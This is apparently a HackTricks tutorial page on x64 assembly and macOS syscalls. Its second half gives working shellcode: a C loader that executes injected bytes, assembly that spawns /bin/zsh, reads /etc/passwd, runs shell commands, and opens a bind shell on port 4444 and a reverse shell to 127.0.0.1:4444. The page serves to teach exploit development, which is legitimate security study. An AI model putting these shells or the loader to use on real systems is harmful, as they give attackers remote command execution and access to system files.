# Introduction to x64

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Introduction to x64**

x64, also known as x86-64, is a 64-bit processor architecture predominantly used in desktop and server computing. Originating from the x86 architecture produced by Intel and later adopted by AMD with the name AMD64, it's the prevalent architecture in personal computers and servers today.

### **Registers**

x64 expands upon the x86 architecture, featuring **16 general-purpose registers** labeled `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, and `r8` through `r15`. Each of these can store a **64-bit** (8-byte) value. These registers also have 32-bit, 16-bit, and 8-bit sub-registers for compatibility and specific tasks.

1. **`rax`** - Traditionally used for **return values** from functions.
2. **`rbx`** - Often used as a **base register** for memory operations.
3. **`rcx`** - Commonly used for **loop counters**.
4. **`rdx`** - Used in various roles including extended arithmetic operations.
5. **`rbp`** - **Base pointer** for the stack frame.
6. **`rsp`** - **Stack pointer**, keeping track of the top of the stack.
7. **`rsi`** and **`rdi`** - Used for **source** and **destination** indexes in string/memory operations.
8. **`r8`** to **`r15`** - Additional general-purpose registers introduced in x64.

### **Calling Convention**

The x64 calling convention varies between operating systems. For instance:

* **Windows**: The first **four parameters** are passed in the registers **`rcx`**, **`rdx`**, **`r8`**, and **`r9`**. Further parameters are pushed onto the stack. The return value is in **`rax`**.
* **System V (commonly used in UNIX-like systems)**: The first **six integer or pointer parameters** are passed in registers **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, and **`r9`**. The return value is also in **`rax`**.

If the function has more than six inputs, the **rest will be passed on the stack**. **RSP**, the stack pointer, has to be **16 bytes aligned**, which means that the address it points to must be divisible by 16 before any call happens. This means that normally we would need to ensure that RSP is properly aligned in our shellcode before we make a function call. However, in practice, system calls work many times even if this requirement is not met.

### **Common Instructions**

x64 instructions have a rich set, maintaining compatibility with earlier x86 instructions and introducing new ones.

* **`mov`**: **Move** a value from one **register** or **memory location** to another.
  * Example: `mov rax, rbx` — Moves the value from `rbx` to `rax`.
* **`push`** and **`pop`**: Push or pop values to/from the **stack**.
  * Example: `push rax` — Pushes the value in `rax` onto the stack.
  * Example: `pop rax` — Pops the top value from the stack into `rax`.
* **`add`** and **`sub`**: **Addition** and **subtraction** operations.
  * Example: `add rax, rcx` — Adds the values in `rax` and `rcx` storing the result in `rax`.
* **`mul`** and **`div`**: **Multiplication** and **division** operations. Note: these have specific behaviors regarding operand usage.
* **`call`** and **`ret`**: Used to **call** and **return from functions**.
* **`int`**: Used to trigger a software **interrupt**. E.g., `int 0x80` was used for system calls in 32-bit x86 Linux.
* **`cmp`**: **Compare** two values and set the CPU's flags based on the result.
  * Example: `cmp rax, rdx` — Compares `rax` to `rdx`.
* **`je`, `jne`, `jl`, `jge`, ...**: **Conditional jump** instructions that change control flow based on the results of a previous `cmp` or test.
  * Example: After a `cmp rax, rdx` instruction, `je label` — Jumps to `label` if `rax` is equal to `rdx`.
* **`syscall`**: Used for **system calls** in some x64 systems (like modern Unix).
* **`sysenter`**: An optimized **system call** instruction on some platforms.

### **Function Prologue**

1. **Push the old base pointer**: `push rbp` (saves the caller's base pointer)
2. **Move the current stack pointer to the base pointer**: `mov rbp, rsp` (sets up the new base pointer for the current function)
3. **Allocate space on the stack for local variables**: `sub rsp, <size>` (where `<size>` is the number of bytes needed)

### **Function Epilogue**

1. **Move the current base pointer to the stack pointer**: `mov rsp, rbp` (deallocate local variables)
2. **Pop the old base pointer off the stack**: `pop rbp` (restores the caller's base pointer)
3. **Return**: `ret` (returns control to the caller)

## macOS

### syscalls

There are different classes of syscalls, you can [**find them here**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**

```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */	
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```

Then, you can find each syscall number [**in this url**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**

```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); } 
2	AUE_FORK	ALL	{ int fork(void); } 
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); } 
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); } 
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); } 
6	AUE_CLOSE	ALL	{ int close(int fd); } 
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); } 
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); } 
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); } 
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); } 
[...]
```

So in order to call the `open` syscall (**5**) from the **Unix/BSD class** you need to add it: `0x2000000`

So, the syscall number to call open would be `0x2000005`

### Shellcodes

To compile:

{% code overflow="wrap" %}
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
{% endcode %}

To extract the bytes:

```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
    echo -n '\\x'$c
done
```

<details>

<summary>C code to test the shellcode</summary>

```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
    printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
 
    void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
 
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
    printf("[+] SUCCESS: mmap\n");
    printf("    |-> Return = %p\n", ptr);
 
    void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
    printf("[+] SUCCESS: memcpy\n");
    printf("    |-> Return = %p\n", dst);

    int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

    if (status == -1) {
        perror("mprotect");
        exit(-1);
    }
    printf("[+] SUCCESS: mprotect\n");
    printf("    |-> Return = %d\n", status);

    printf("[>] Trying to execute shellcode...\n");

    sc = ptr;
    sc();
 
    return 0;
}
```

</details>

#### Shell

Taken from [**here**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) and explained.

{% tabs %}
{% tab title="with adr" %}
```armasm
bits 64
global _main
_main:
    call    r_cmd64
    db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
    pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
    xor     rdx, rdx          ; store null arg3
    push    59                ; put 59 on the stack (execve syscall)
    pop     rax               ; pop it to RAX
    bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
    syscall
```
{% endtab %}

{% tab title="with stack" %}
```armasm
bits 64
global _main

_main:
    xor     rdx, rdx          ; zero our RDX
    push    rdx               ; push NULL string terminator
    mov     rbx, '/bin/zsh'   ; move the path into RBX
    push    rbx               ; push the path, to the stack
    mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
    push    59                ; put 59 on the stack (execve syscall)
    pop     rax               ; pop it to RAX
    bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
    syscall
```
{% endtab %}
{% endtabs %}

#### Read with cat

The goal is to execute `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, so the second argument (x1) is an array of params (which in memory these means a stack of the addresses).

```armasm
bits 64
section .text
global _main

_main:
    ; Prepare the arguments for the execve syscall
    sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

    lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
    lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"
    
    ; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
    push rsi   ; Add "/etc/passwd" to the stack (arg0)
    push rdi   ; Add "/bin/cat" to the stack (arg1)
    
    ; Set in the 2nd argument of exec the addr of the array
    mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

    xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)
    
    push    59      ; put 59 on the stack (execve syscall)
    pop     rax     ; pop it to RAX
    bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
    syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```

#### Invoke command with sh

```armasm
bits 64
section .text
global _main

_main:
    ; Prepare the arguments for the execve syscall
    sub rsp, 32           ; Create space on the stack

    ; Argument array
    lea rdi, [rel touch_command]        
    push rdi                      ; push &"touch /tmp/lalala"   
    lea rdi, [rel sh_c_option]    
    push rdi                      ; push &"-c"
    lea rdi, [rel sh_path]
    push rdi                      ; push &"/bin/sh"   

    ; execve syscall
    mov rsi, rsp                  ; rsi = pointer to argument array
    xor rdx, rdx                  ; rdx = NULL (no env variables)
    push    59                    ; put 59 on the stack (execve syscall)
    pop     rax                   ; pop it to RAX
    bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
    syscall

_exit:
    xor rdi, rdi                  ; Exit status code 0
    push    1                     ; put 1 on the stack (exit syscall)
    pop     rax                   ; pop it to RAX
    bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
    syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```

#### Bind shell

Bind shell from [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) in **port 4444**

```armasm
section .text
global _main
_main:
    ; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
    xor  rdi, rdi
    mul  rdi
    mov  dil, 0x2
    xor  rsi, rsi
    mov  sil, 0x1
    mov  al, 0x2
    ror  rax, 0x28
    mov  r8, rax
    mov  al, 0x61
    syscall

    ; struct sockaddr_in {
    ;         __uint8_t       sin_len;
    ;         sa_family_t     sin_family;
    ;         in_port_t       sin_port;
    ;         struct  in_addr sin_addr;
    ;         char            sin_zero[8];
    ; };
    mov  rsi, 0xffffffffa3eefdf0
    neg  rsi
    push rsi
    push rsp
    pop  rsi

    ; bind(host_sockid, &sockaddr, 16)
    mov  rdi, rax
    xor  dl, 0x10
    mov  rax, r8
    mov  al, 0x68
    syscall    

    ; listen(host_sockid, 2)
    xor  rsi, rsi
    mov  sil, 0x2
    mov  rax, r8
    mov  al, 0x6a
    syscall

    ; accept(host_sockid, 0, 0)
    xor  rsi, rsi
    xor  rdx, rdx
    mov  rax, r8
    mov  al, 0x1e
    syscall

    mov rdi, rax
    mov sil, 0x3

dup2:
    ; dup2(client_sockid, 2)
    ;   -> dup2(client_sockid, 1)
    ;   -> dup2(client_sockid, 0)
    mov  rax, r8
    mov  al, 0x5a
    sub  sil, 1
    syscall
    test rsi, rsi
    jne  dup2

    ; execve("//bin/sh", 0, 0)
    push rsi
    mov  rdi, 0x68732f6e69622f2f
    push rdi
    push rsp
    pop  rdi
    mov  rax, r8
    mov  al, 0x3b
    syscall
```

#### Reverse Shell

Reverse shell from [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell to **127.0.0.1:4444**

```armasm
section .text
global _main
_main:
    ; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
    xor  rdi, rdi
    mul  rdi
    mov  dil, 0x2
    xor  rsi, rsi
    mov  sil, 0x1
    mov  al, 0x2
    ror  rax, 0x28
    mov  r8, rax
    mov  al, 0x61
    syscall

    ; struct sockaddr_in {
    ;         __uint8_t       sin_len;
    ;         sa_family_t     sin_family;
    ;         in_port_t       sin_port;
    ;         struct  in_addr sin_addr;
    ;         char            sin_zero[8];
    ; };
    mov  rsi, 0xfeffff80a3eefdf0
    neg  rsi
    push rsi
    push rsp
    pop  rsi

    ; connect(sockid, &sockaddr, 16)
    mov  rdi, rax
    xor  dl, 0x10
    mov  rax, r8
    mov  al, 0x62
    syscall    

    xor rsi, rsi
    mov sil, 0x3

dup2:
    ; dup2(sockid, 2)
    ;   -> dup2(sockid, 1)
    ;   -> dup2(sockid, 0)
    mov  rax, r8
    mov  al, 0x5a
    sub  sil, 1
    syscall
    test rsi, rsi
    jne  dup2

    ; execve("//bin/sh", 0, 0)
    push rsi
    mov  rdi, 0x68732f6e69622f2f
    push rdi
    push rsp
    pop  rdi
    xor  rdx, rdx
    mov  rax, r8
    mov  al, 0x3b
    syscall
```

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
